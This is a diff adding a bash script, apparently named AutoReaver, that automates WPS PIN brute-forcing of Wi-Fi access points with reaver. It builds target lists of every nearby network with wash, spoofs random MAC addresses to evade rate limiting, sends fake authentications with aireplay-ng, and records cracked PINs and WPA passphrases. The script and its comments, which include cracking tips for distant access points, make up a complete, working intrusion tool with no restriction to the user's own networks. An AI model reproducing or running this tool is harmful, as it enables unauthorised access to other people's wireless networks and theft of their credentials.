@@ -1,0 +1,692 @@
+#!/bin/bash
+
+### REQUIREMENTS
+#  (If you use Backtrack 5, you probably have all the following)
+# - reaver 1.4 (I didn't try it with previous versions)
+# - X-environment (unless you'll change 'konsole' invocations to 'screen' or something like that...)
+# - gawk (Gnu AWK)
+# - macchanger
+# - airmon-ng, airodump-ng
+# - perl
+# - wireless adapter which suppors injection (see reaver manual)
+# - logged as root on your system (otherwise some things could not work)
+
+### HOW IT WORKS
+# - Script takes AP targets list from text file in following format
+#   [BSSID] [CHANNEL] [ESSID]
+# - Every line of list file is checked separately in for loop
+# - After check whole list script automatically restarts wifi driver, changes MAC address of your card,
+# - Whole list is checked again and again... in while loop until there is nothing to check
+# - You can setup your attack using variables from CONFIGURATION section (sleep/wait times etc.)
+# - You can disable checking AP by adding # sign in the beginning of line
+# - Found PINS/WPA PASSPHRASES are stored in {CRACKED_LIST_FILE_PATH} file
+# - Blue color (echoBlue function) displays notice informations from the script
+# - Green color (echoGreen function) displays executing commands
+# - White color displays output from reaver and other programs which are executed inside the script
+
+### STATISTICS (script provides following informations)
+# - Dates of checked pins (seconds since epoch format), which are stored in separate directory {PIN_DATE_TMP_DIR}
+# - Average time between checked PINs (based on records stored in {PIN_DATE_TMP_DIR})
+# - Number of checked PINs stored in reaver session files (first line of every reaver session file)
+
+### HOW TO PREPARE TARGETS LIST FOR AutoReaver 
+# Use following Wash command for that with little AWK scripting
+# You can paste this command into any bash script
+# substr($0, index($0,$6)) is only for handle things like "FRITZ!Box Fon WLAN 7360" which requires to print from 6th do last column :)
+#### PREPARING LIST COMMAND (contained in file: washAutoReaverList)
+# wash -i mon0 -C -s | awk -F' ' '{ if($5 == "No"){print $1 " " $2 " " substr($0, index($0,$6))}}' > myAPTargetsList
+
+### COMMON KONSOLE ERROR
+# If you see error like:
+# QMetaObject::invokeMethod: No such method Konsole::Application::loadCommandLineOptionsForNewInstance()
+# Don't bother with that - it doesn't disturb any process
+
+
+##### My personal advices for cracking:
+#
+# Things to check if something is going wrong with cracking:
+# 1) Look carefully at Beacons column in airodump output (it has to grow at least 3 per second)
+#    And look at RXQ - Received packets in last 10 seconds (should be at least 30), 
+#    otherwise your connection with AP is too poor.
+# 2) Setup big timeout (-t) if you try to break far AP (my setup was 20)
+# 3) Look carefully at reaver log, especially at Receiving M1, M2, ... M6 messages
+#    if nothing is receiving, something is wrong with signal, or AP has been blocked
+# 4) If you encounter a lot of "Warning: Receive timeout occured" messages, it's probably
+#    something with signal (try to get better connection changing antenna positioning
+#    or get close to AP if possible, even opening windows can help.. because glass is blocking the signal)
+# 5) To check signal quality from targeting AP you can use software like: inSSIDer (PC), Wifi Analyzer (Android)
+# 6) IMPORTANT THING is to NOT using other scanning software in the same time with reaver, it can slow down the process,
+#    Especially things like wash, nmap, wicd, and other scanners are changing channels during the scan, 
+#    You can however easily check if that's happening - looking at upper right corner of airodump-ng output,
+#    If you see changing values like "Fixed channel mon0: 3,4,10,9 etc." that means something is changing channels of mon0,
+#    which you should prevent (because your AP is transmitting on one channel)
+##
+# I have broken one access point with PWR -75 to -80 (airodump-ng)
+# with following settings:
+# ADDITIONAL_OPTIONS="-E -S -vv -N -T 1 -t 20 -d 0 -l 420 -x 30"
+
+#### Helpful commands
+#    sudo iwlist wlan0 scan
+#    wash -i mon0 -C -s
+
+if [[ ! -f $(pwd)"/configurationSettings" ]]; then
+    echo "OOOOOPS! You've lost configuration file of AutoReaver: ./configurationSettings";
+    echo "Try to recover this file, or download default version from project site, and try again";
+    exit;
+fi
+source $(pwd)"/configurationSettings";
+
+
+if [[ -z "$1" ]]; then
+echoBlue "
+Use this script as follows:
+$0 [FILE_PATH]
+[FILE_PATH] is relative or absolute path to the file containing lines: 
+[BSSID] [CHANNEL] [SSID CAN BE WITH SPACES]
+Remember that [SSID] can contain spaces but BSSID and CHANNEL mu go before SSID
+example file below:
+
+AA:BB:CC:DD:EE:FF 1 TP-link
+AA:CC:CC:DD:EE:FF 2 dlink
+AA:00:11:99:EE:FF 11 My Fritz Box Wlan 800
+
+To disable certain line, you can add comment symbol in the beginnig of line like this:
+
+# AA:00:11:99:EE:FF 11 My Fritz Box Wlan 800
+";
+exit;
+fi
+
+if [[ ! -f "$1" ]]; then
+   echoBlue "File $1 doesn't exist";
+   echoBlue "Usage: $0 [FILE_PATH]";
+   echoBlue "Type $0 to get more information";
+   exit;
+fi
+
+FILEPATH="$1";
+
+###########################################################################################
+##### YOU SHOULDN'T MODIFY ANY LINES BELOW... UNLESS YOU KNOW WHAT YOU'RE DOING :) ########
+###########################################################################################
+
+
+#### MAKE ALL TMP DIRECTORIES IF THEY DON'T EXIST ######
+if [[ ! -d "$TMP_DIR" ]]; then
+    mkdir -p -m 700 $TMP_DIR;
+fi
+if [[ ! -d "$LIMIT_TMP_DIR" ]]; then
+    mkdir -p -m 700 $LIMIT_TMP_DIR;
+fi
+if [[ ! -d "$PIN_DATE_TMP_DIR" ]]; then
+    mkdir -p -m 700 $PIN_DATE_TMP_DIR;
+fi
+if [[ ! -f "$CRACKED_LIST_FILE_PATH" ]]; then
+    echo "" >> $CRACKED_LIST_FILE_PATH;
+    if [[ ! -f "$CRACKED_LIST_FILE_PATH" ]]; then
+	echo "Couldn't create file: $CRACKED_LIST_FILE_PATH";
+	echo "Check if script has writing permissions";
+	exit;
+    fi
+fi
+if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
+    echoBlue "Reaver session directory is not detected";
+    echoBlue "$REAVER_SESSION_DIR is not a directory";
+    echoBlue "You must setup valid directory in REAVER_SESSION_DIR ";
+    exit;
+fi
+
+touch $CHECK_ACTIVITY_FILE && chmod 600 $CHECK_ACTIVITY_FILE;
+
+#####################################################################################
+##### FUNCTIONS #####################################################################
+#####################################################################################
+stopMonitor() {
+	  echoGreen "killall airodump-ng" && killall airodump-ng &>/dev/null;
+	  echoGreen "killall aireplay-ng" && killall aireplay-ng &>/dev/null;
+	  echoGreen "airmon-ng stop mon0" && airmon-ng stop mon0;
+	  echoGreen "airmon-ng stop $WIRELESS_INTERFACE" && airmon-ng stop $WIRELESS_INTERFACE;
+	  echoGreen "airmon-ng check kill" && airmon-ng check kill;
+}
+restartMonitor() {
+      stopMonitor;
+      echoGreen "airmon-ng start $WIRELESS_INTERFACE" && airmon-ng start $WIRELESS_INTERFACE;
+}
+changeMacTo(){
+      echoGreen "ifconfig mon0 down" && ifconfig mon0 down;
+      echoGreen "macchanger -m $1 mon0" && macchanger -m $1 mon0;
+      echoGreen "ifconfig mon0 up" && ifconfig mon0 up;
+}
+
+getRandomMac(){
+      echo $(perl -e 'sub c{if(rand(1)>0.5){chr(rand(6)+97);}else{int(rand(9))}};sub l{":".c.c;}; print "00".l.l.l.l.l;');      
+}
+
+# this function will make temporary script file
+# that will be executed in konsole process
+# unfortunately konsole doesn't work with eval -e $variableWithCode
+# so I had to put this into temporary script file
+makeActivityChecker() {
+# kill Activity Checker if one exists
+kill $(ps aux | grep 'Reaver Activity Checker' | gawk '{print $2; exit;}') 2>/dev/null;
+# escaped \$(date) because it has to be invoked during script run, not before :)
+local TMP_SCRIPT=$(cat  <<EOF
+echo "Reaver will be killed after $INACTIVITY_TIMEOUT seconds of inactivity ";
+echo "------------------------------------------------------------------";
+echo "It will be checking modification time of file $CHECK_ACTIVITY_FILE";
+echo "File is touched by perl when reaver outputs: Receive M1...M6 messages";
+echo "This should prevent reaver from stuck on one AP instead of checking others.";
+echo "Hit CTRL+C to stop";
+TIMEOUT=$INACTIVITY_TIMEOUT;
+while true; do
+    sleep 10;
+    if [[ -z \$(ps x | grep -v grep | grep reaver) ]]; then
+      echo \$(date)": No reaver process found....skipping";
+      continue;
+    fi
+    if [[ ! -f $CHECK_ACTIVITY_FILE ]]; then
+	echo "File $CHECK_ACTIVITY_FILE doesn't exist yet...";
+	continue;
+    fi
+    LASTMOD=\$(stat -c %X $CHECK_ACTIVITY_FILE);
+    NOW=\$(date +%s);
+    CURRENT_INACTIVITY=\$[\$NOW-\$LASTMOD];
+    echo \$(date)": Reaver inactivity...\$CURRENT_INACTIVITY/\$TIMEOUT seconds";
+    if [[ \$[\$NOW] > \$[\$LASTMOD+\$TIMEOUT] ]]; then
+	killall -INT reaver;
+	echo "Reaver was killed...";
+    fi
+done
+EOF
+);
+konsole --title 'Reaver Activity Checker' -e /bin/sh -c "$TMP_SCRIPT" 2>/dev/null;
+}
+
+isProcessActive() {
+  if [[ -z $(ps x | gawk '/'"$1"'/ && !/gawk/ { print "active" }') ]]; then
+    echo 0
+  else 
+    echo 1
+  fi
+}
+
+isValidMac(){
+  if [[ ! -z "$(echo $1 | grep -i -P ^[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}$)" ]]; then
+    echo 1;
+  else 
+    echo 0;
+  fi
+}
+
+getKonsolePidByProcessName(){
+    ps aux | gawk '!/konsole/ || !/'"$1"'/{ next; } {print $2}';
+}
+
+getNotKonsoleProcessByName(){
+    ps aux | gawk '/konsole/ || !/'"$1"'/{ next; } {print $2}';
+}
+
+getPidByProcessName(){
+    ps aux | gawk '!/'"$1"'/{ next; } {print $2}';
+}
+
+getWifiCardDriver(){
+    lshw -c network | gawk '!/wireless/ || !/driver/{ next; } { while(++i<=NF){ if($i ~ /driver\=/){ sub("driver=","",$i); print $i; } } }';
+}
+
+resetWifiCard(){
+  local WIFI_DRIVER=$(getWifiCardDriver);
+  local RESET_CARD_DRIVER_CMD="";
+  if [[ -z "$WIFI_DRIVER" ]]; then
+	echoBlue "Sorry couldn't get your WifiDriver";
+	echoBlue "Check if any wifi card is connected and try again";
+	echoBlue "You have to check getWifiCardDriver() function on your own...";
+	exit;
+  else 
+	echoBlue "I found that your WIFI driver is $WIFI_DRIVER ";
+	echoBlue "Resetting WIFI card ";
+	echoGreen "modprobe -r $WIFI_DRIVER && modprobe $WIFI_DRIVER";
+	modprobe -r $WIFI_DRIVER && modprobe $WIFI_DRIVER;
+  fi
+}
+
+# gets last date in 'second since epoch' format and prints in format YYYY-MM-DD HH:MM:SS
+getLastPinDate(){
+    local F=$1;
+    if [[ ! -f "$F" || -z "$F" ]]; then
+      return;
+    fi
+    echo $(tail -1 $F | awk '{print strftime("%Y-%m-%d %H:%M:%S",$1)}');
+}
+# counts average number of seconds between pin dates (every line represents pin date)
+countAVGSecondsBetweenDates(){
+    local F=$1;
+    if [[ ! -f "$F" || -z "$F" ]]; then
+      echo "0";
+      return;
+    fi
+    cat $F | perl -lane 'use POSIX;
+			 BEGIN { $avgSum=0; $avgCnt=0; $lastDate=0; $curDiff=0; }
+			 { 
+			    if($lastDate==0) { $lastDate=int($_); next;}
+			    else { $curDiff=(int($_)-$lastDate); $avgSum+=$curDiff; $avgCnt++; $lastDate=int($_); }
+			 }
+			 END { if($avgSum>0 && $avgCnt>0){ print floor($avgSum/$avgCnt); } }';
+				 
+}
+
+# echo green text
+echoGreen(){
+   echo "$(tput setaf 2)>>>>>> ${1}$(tput sgr0)";
+}
+# echo blue text
+echoBlue(){
+   echo "$(tput setaf 6)>>>>>> ${1}$(tput sgr0)";
+}
+
+# checks whether airodump-ng works and scans properly
+# uses globals: TMP_DIR
+isAirodumpWorking(){
+  #local CHECK=$(iwlist wlan0 scan | grep "$1");
+  if [[ -z $(ifconfig | grep "mon0") ]]; then
+    restartMonitor &>/dev/null;
+  fi
+  local TMP_LOG="$TMP_DIR/isAirodumpWorking";
+  local AIRODUMP_CSV_LOG=$TMP_LOG"-01.csv";
+  local BEGIN_TIME=$(date +%s);
+  local TIMEOUT=15;
+  # clear old logs
+  rm $AIRODUMP_CSV_LOG &>/dev/null;
+  CM="konsole --title 'airodump-ng' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG mon0' ";
+  eval $CM 2>/dev/null
+  local LAST_PID=$(getNotKonsoleProcessByName 'airodump-ng');
+  local CHECK="";
+  while true; do  
+      # if we reached timeout we have to end with failure
+      # so AP is offline
+      if [[ $[$BEGIN_TIME+$TIMEOUT] < $[$(date +%s)] ]]; then
+	  kill $LAST_PID;
+	  rm $AIRODUMP_CSV_LOG &>/dev/null;
+	  echo "0";
+	  return;
+      fi
+      # re-check airodump-ng log after X seconds
+      sleep 4;
+      if [[ -f "$AIRODUMP_CSV_LOG" ]];then
+	 CHECK=$(cat $AIRODUMP_CSV_LOG | grep -i -P '[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}');
+      else
+	 continue;
+      fi
+      # if CHECK isn't empty it means that we have some BSSIDs in log 
+      if [[ -n "$CHECK" ]]; then
+	  #cp $AIRODUMP_CSV_LOG /root/__TEST
+	  kill $LAST_PID;
+	  rm $AIRODUMP_CSV_LOG &>/dev/null;
+	  echo "1";
+	  return;
+      fi
+  done
+}
+
+
+# waits XX seconds for AP to show up in airodump-ng log
+# using: isAPOnline AA:BB:CC:DD:EE:FF 3
+# BSSID and CHANNEL are important parameters, because airodump doesn't need to output all networks into it's log
+# and also it's much much faster to connect to known BSSID and CHANNEL (it doesn't need to jump between channels)
+# it gets timeout from global BSSID_ONLINE_TIMEOUT
+# uses globals: BSSID_ONLINE_TIMEOUT, TMP_DIR
+isAPOnline(){
+  #local CHECK=$(iwlist wlan0 scan | grep "$1");
+  if [[ -z $(ifconfig | grep "mon0") ]]; then
+    restartMonitor &>/dev/null;
+  fi
+  local BSSID=$1;
+  local CHANNEL=$2;
+  local TMP_LOG="$TMP_DIR/isAPOnline";
+  local AIRODUMP_CSV_LOG=$TMP_LOG"-01.csv";
+  local BEGIN_TIME=$(date +%s);
+  # clear old logs
+  rm $AIRODUMP_CSV_LOG &>/dev/null;
+  CM="konsole --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID --channel=$CHANNEL mon0' ";
+  eval $CM 2>/dev/null
+  local LAST_PID=$(getNotKonsoleProcessByName 'airodump-ng');
+  local CHECK="";
+  while true; do  
+      # if we reached timeout we have to end with failure
+      # so AP is offline
+      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] < $[$(date +%s)] ]]; then
+	  if [[ ! -z $LAST_PID ]]; then
+	    kill $LAST_PID;
+	  fi;
+	  rm $AIRODUMP_CSV_LOG &>/dev/null;
+	  echo "0";
+	  return;
+      fi
+      # re-check airodump-ng log after X seconds
+      sleep 2;
+      if [[ -f "$AIRODUMP_CSV_LOG" ]];then
+	 CHECK=$(cat $AIRODUMP_CSV_LOG | grep $BSSID);
+      else
+	 continue;
+      fi
+      # if CHECK isn't empty it means that we have BSSID in airodump-ng log
+      # so AP is online
+      if [[ -n "$CHECK" ]]; then
+	  if [[ ! -z $LAST_PID ]]; then
+	    kill $LAST_PID;
+	  fi;
+	  rm $AIRODUMP_CSV_LOG &>/dev/null;
+	  echo "1";
+	  return;
+      fi
+  done
+}
+
+# uses globals: BSSID_ONLINE_TIMEOUT, TMP_DIR
+findAPChannel(){
+  if [[ -z $(ifconfig | grep "mon0") ]]; then
+    restartMonitor &>/dev/null;
+  fi
+  local BSSID=$1;
+  local TMP_LOG="$TMP_DIR/findAPChannel";
+  local AIRODUMP_CSV_LOG=$TMP_LOG"-01.csv";
+  local BEGIN_TIME=$(date +%s);
+   # clear old logs
+  rm $AIRODUMP_CSV_LOG &>/dev/null;
+  CM="konsole --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID mon0' ";
+  eval $CM 2>/dev/null
+  local LAST_PID=$(getNotKonsoleProcessByName 'airodump-ng');
+  local CHANNEL="";
+  while true; do
+      # if we reached timeout we have to end with failure
+      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] < $[$(date +%s)] ]]; then
+	  if [[ ! -z $LAST_PID ]]; then
+	    kill $LAST_PID;
+	  fi;
+	  rm $AIRODUMP_CSV_LOG &>/dev/null;
+	  echo "0";
+	  return;
+      fi
+      # re-check airodump-ng log after X seconds
+      sleep 5;
+      if [[ -f "$AIRODUMP_CSV_LOG" ]];then
+	 CHANNEL=$(cat $AIRODUMP_CSV_LOG | gawk -F', ' '{ if(/^'$BSSID'/){ print gensub(/ +/,"","g", $4); exit; } }');
+      else 
+	 continue;
+      fi
+      # if channel was found
+      if [[ -n "$CHANNEL" ]]; then
+          # bad channel.... check again
+          if [[ $CHANNEL -gt 14 ]]; then
+	      continue;
+          fi
+	  kill $LAST_PID;
+	  rm $AIRODUMP_CSV_LOG &>/dev/null;
+	  echo $CHANNEL;
+	  return;
+      fi
+  done
+}
+########### END OF FUNCTIONS #######################################################
+# check logged user
+if [[ $(whoami) != 'root' ]]; then
+   echoBlue "You have to be logged as root, otherwise some commands may not work";
+   exit;
+fi
+
+if [[ $[$INACTIVITY_TIMEOUT] > 0 ]]; then
+    makeActivityChecker;  
+fi
+
+# !IMPORTANT!! Changing Internat Field Separator to \n gives us ability 
+# to loop over file using new lines instead of words
+IFS=$'\n';
+
+
+# make copy of your list, before proceed (just in case you need it)
+cp "$FILEPATH" "${FILEPATH}_backup";
+
+resetWifiCard;
+restartMonitor;
+
+
+if [ "$MACCHANGER_ON" == "ONCE" ]; then
+      if [[ -z "$SPOOFED_MAC" ]]; then
+	      MAC=$(getRandomMac);
+	      changeMacTo $MAC;
+      fi
+      if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
+	      MAC=$SPOOFED_MAC;
+	      changeMacTo $SPOOFED_MAC;
+      fi
+fi;
+
+
+while true; do
+  # check if there is anything to attack in FILE and exit script if there is nothing
+  if [[ -z "$(cat $FILEPATH | grep -i -P ^[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2})" ]]; then
+    echoBlue "There is no target to attack in file $FILEPATH";
+    exit;
+  fi
+  # get targets (list of pairs BSSID CHANNEL from file), below near done is file
+  echoBlue "Start reading file: $FILEPATH";
+  FILE=$(cat $FILEPATH);
+  
+  while true; do
+      echoBlue "Checking is airodump-ng working....";
+      if [[ $(isAirodumpWorking) != "1" ]]; then
+	  echoBlue "PROBLEM DETECTED!!! airodump-ng seems not returning any output!!";
+	  echoBlue "Trying to reset wifi driver... and monitor";
+	  stopMonitor;
+	  resetWifiCard;    
+	  restartMonitor;
+	  if [ "$MACCHANGER_ON" == "ONCE" ]; then
+		if [[ -z "$SPOOFED_MAC" ]]; then
+			MAC=$(getRandomMac);
+			changeMacTo $MAC;
+		fi
+		if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
+			MAC=$SPOOFED_MAC;
+			changeMacTo $SPOOFED_MAC;
+		fi
+	  fi;
+	  sleep 10;
+      else
+	  echoBlue "airodump-ng is working...";
+	  break;
+      fi
+  done
+ 
+  # see configurationSettings MACCHANGER_ON
+  if [ "$MACCHANGER_ON" == "PER_LOOP" ]; then
+	if [[ -z "$SPOOFED_MAC" ]]; then
+		MAC=$(getRandomMac);
+		changeMacTo $MAC;
+	fi
+	if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
+		MAC=$SPOOFED_MAC;
+		changeMacTo $SPOOFED_MAC;
+	fi
+  fi;
+
+
+  for TARGET in $FILE; do
+      echoBlue "--------------------------------------------------";
+      touch $CHECK_ACTIVITY_FILE;
+      # check if AP was disabled by comment symbol #
+      if [[ $TARGET =~ ^#.* ]]; then
+	 echoBlue "Disabled line detected: $TARGET.";
+	 echoBlue "Skipping...";
+	 continue;
+      fi
+
+      ############# VARIABLES INITIALIZATION ################
+      BSSID=$(echo "$TARGET" | gawk -F' ' '{print $1}');
+      CHANNEL=$(echo "$TARGET" | gawk -F' ' '{print $2}');
+      ESSID=$(echo "$TARGET" | gawk -F' ' '{printf "%s",$3; if(NF>3){ for(i=4;i<=NF;i++){ printf " %s",$i; } }  }');
+      BSSID_CLEAR=$(echo $BSSID | sed s/://g);
+      # session file names are generated from AP MAC: /usr/local/etc/reaver/C8600071B254.wpc
+      # if you encounter problem with this directory just search for reaver session directory and change following line
+      SESSIONFILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.wpc';
+      # tmp file containing dates checked pins of pins in 'seconds since epoch' format
+      BSSID_LAST_PIN_DATE_FILE="$PIN_DATE_TMP_DIR/$BSSID_CLEAR";
+      # tmp file indicating that certain BSSID reached limit
+      BSSID_LIMIT_FILE="$LIMIT_TMP_DIR/$BSSID_CLEAR";
+      if [[ -z "$ESSID" ]]; then 
+	 ESSID="<EMPTY>";
+      fi
+      
+      ############ CHECK FOR EMTPY CHANNEL OR BSSID ###############
+      if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
+	  echoBlue "Error one of variables.. BSSID=$BSSID, CHANNEL=$CHANNEL is empty";
+	  continue;
+      fi
+
+      ############ INCLUDE SPECIFIC SETTINGS PER ACCESS POINT ###################
+      # we don't want use option of previous AP, which might not be overridden by "perAp" configuration file
+      # se defaults should be included in a first place
+      source "$(pwd)/configurationSettings";
+      # if we want to override some default options using "perAp" file it's included below
+      if [[ -f "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR" ]]; then
+          echoBlue "I've included specific settings for '$ESSID' from file $(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";    
+	  source "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
+      fi
+      ########## SLEEP BETWEEN APS ###############
+      if [[ $[$SLEEP_BETWEEN_APS] > 0 ]]; then
+	echoBlue "Sleeping between AP's for $SLEEP_BETWEEN_APS seconds....";
+	sleep $SLEEP_BETWEEN_APS;
+      fi
+
+      echoBlue "Checking: BSSID=$BSSID, CHANNEL=$CHANNEL, ESSID=$ESSID ";
+      if [[ -f $SESSIONFILE ]]; then
+	  echoBlue "I've found  "$(head -1 $SESSIONFILE)"  checked PINs in session file";
+      fi
+
+      ######### CHECK IF AP WAS BLOCKED #######
+      # if file indicating AP rate limit exists, and if it was modified less than LIMIT_WAIT_MINUTES minutes
+      # if so.. than BSSID is skipped 
+      if [[ ! -z $(find ${LIMIT_TMP_DIR}/ -type f -name ${BSSID_CLEAR} -mmin -${LIMIT_WAIT_MINUTES}) ]]; then
+	  echoBlue "$BSSID ($ESSID) was blocked less than $LIMIT_WAIT_MINUTES minutes ago, skipping";
+	  continue;
+      fi
+      
+      ######### CHECK IF {MINUTES_WAIT_BETWEEN_PIN_ATTEMPTS} PASSED SINCE LAST PIN CHECK #######
+      # if file indicating AP rate limit exists, and if it was modified less than LIMIT_WAIT_MINUTES minutes
+      # if so.. than BSSID is skipped 
+      if [[ ! -z $(find ${REAVER_SESSION_DIR}/ -type f -name "${BSSID_CLEAR}.wpc" -mmin -${MINUTES_WAIT_BETWEEN_PIN_ATTEMPTS}) ]]; then
+	  echoBlue "$BSSID ($ESSID) was checked less than $MINUTES_WAIT_BETWEEN_PIN_ATTEMPTS minutes ago, skipping";
+	  continue;
+      fi
+
+      ######## SHOW AVERAGE TIME BETWEEN PINS AND CHECK PINS NUM
+      if [[ -f $BSSID_LAST_PIN_DATE_FILE ]]; then
+	  AVG_SECONDS=$(countAVGSecondsBetweenDates $BSSID_LAST_PIN_DATE_FILE);
+	  if [[ ! -z $AVG_SECONDS ]]; then
+	      echoBlue "Average time between PINs: $AVG_SECONDS seconds";
+	  fi
+      fi
+
+
+
+      ######### CHANGE MAC IF SPOOFED ########
+      # here we generate random mac address (containing only numbers 0-9)
+      # first octets should be 02 as most Wireless Cards have
+      # see configurationSettings MACCHANGER_ON
+      if [ "$MACCHANGER_ON" == "ALL" ]; then
+	    if [[ -z "$SPOOFED_MAC" ]]; then
+		    MAC=$(getRandomMac);
+		    changeMacTo $MAC;
+	    fi
+	    if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
+		    MAC=$SPOOFED_MAC;
+		    changeMacTo $SPOOFED_MAC;
+	    fi
+     fi;
+
+      ######## CHECK IF AP IS ONLINE #########
+      echoBlue "Wait $BSSID_ONLINE_TIMEOUT seconds... scanning if $BSSID ($ESSID) is online";
+      # in case that channel is random we have to discover it (but it takes longer time since airodump-ng must hopping between channels)
+      if [[ $CHANNEL == "R" ]]; then
+		echoBlue "Searching for channel....";
+		CHANNEL=$(findAPChannel $BSSID);
+		if [[ $CHANNEL != "0" ]]; then
+		    echoBlue "$BSSID IS ONLINE!!! Currently it has CHANNEL  $CHANNEL  Proceeed attack!!!";
+		else 
+		    echoBlue "$BSSID ($ESSID) is OFFLINE (couldn't find channel).. skipping to another...";
+		    continue;
+		fi
+      else 
+	        if [[ $(isAPOnline $BSSID $CHANNEL) == "1" ]]; then
+		    echoBlue "$BSSID ($ESSID) IS ONLINE!!! Proceed attack!!!";
+		else 
+		    echoBlue "$BSSID ($ESSID) is OFFLINE.. skipping to another...";
+		    continue;
+		fi
+      fi
+
+      ############# START KONSOLE COMMANDS WITH: REAVER && R.A.C. && AIREPLAY && AIRODUMP
+      if [[ $NO_AIRODUMP == 0 ]]; then
+	  # start monitoring BSSID & show blocked WPS in other konsole windows
+	  CM="konsole --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --bssid=$BSSID --channel=$CHANNEL mon0' ";
+	  echoGreen "$CM" && eval $CM 2>/dev/null
+      fi
+      if [[ $NO_AIREPLAY == 0 ]]; then
+	  # sending fake auth every X sec to keep alive connection and better performance of reaver
+	  CM="konsole --title 'Fake authorization aireplay-ng' -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $BSSID -c $BSSID mon0' ";
+	  echoGreen "$CM" && eval $CM 2>/dev/null
+      fi
+      # there are only 3 attempts from 1 MAC
+      echoBlue "Additional options are: $ADDITIONAL_OPTIONS";
+      COMMAND="reaver -i mon0 -b $BSSID -s $SESSIONFILE --channel=$CHANNEL --mac=$MAC -vv $ADDITIONAL_OPTIONS";
+      # output of reaver is piped to perl which checks if 'AP rate limiting' is printed by reaver, and reacts creating temporary file indicating that WPS is blocked
+      # and kills reaver process so loop can continue
+      echoGreen "$COMMAND" && eval $COMMAND \
+       | perl -lane '
+	  # write current date (seconds since epoch) to file if PIN was checked
+	  if(/Received WSC NACK/){
+	      system("echo \$(date +%s) >> '$BSSID_LAST_PIN_DATE_FILE'");
+	  }
+
+	  # check activity if performed by touching temporary file
+	  if(/'$REAVER_ACTIVITY_PERL_REGEXP'/){
+	      system("touch '$CHECK_ACTIVITY_FILE'");
+	  }
+	  # check rate limiting
+	  elsif(/AP rate limiting/){
+	      system("touch '$BSSID_LIMIT_FILE'");
+	      # sending -INT signal acts like CTRL + C shortcut
+	      system("killall -INT reaver"); 
+	      print $_,"\n[+] Session saved"; 
+	      exit 1; 
+	  }
+	  # check if PIN or PSK was discovered
+	  elsif (/WPS PIN/){  
+	      open FILE, ">>'$CRACKED_LIST_FILE_PATH'"; 
+	      print FILE "-----PIN----'$BSSID' ('$ESSID')-----------";
+	      print FILE $_;
+	      close FILE;
+	      # remove AP from your list by prepend with comment symbol "#"
+	      system("sed -i \"s/'$BSSID'/#----PIN-WAS-FOUND---'$BSSID'/\" '$FILEPATH'");
+	      print "\nPIN WAS FOUND!!!";
+	      print "\nI`ve logged data to file '$CRACKED_LIST_FILE_PATH'\n";
+	  }
+	  elsif (/WPA PSK/){
+	      open FILE, ">>'$CRACKED_LIST_FILE_PATH'"; 
+	      print FILE "-----PASSPHRASE----'$BSSID' ('$ESSID')-----------";
+	      print FILE $_;
+	      close FILE;
+	  }
+	  print $_;
+      ';
+      # kill old konsole windows (if they persist)
+      kill -INT $(getKonsolePidByProcessName 'airodump-ng') 2>/dev/null;
+      kill -INT $(getKonsolePidByProcessName 'aireplay-ng') 2>/dev/null;
+    done
+
+    ########## SLEEP AFTER LIST RECHECK #################
+    if [[ $[$SLEEP_BEFORE_LIST_RECHECK] > 0 ]]; then
+      echoBlue "Sleeping before another list re-check for $SLEEP_BEFORE_LIST_RECHECK seconds....";
+      echoBlue ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>";
+      sleep $SLEEP_BEFORE_LIST_RECHECK;
+    fi
+ done
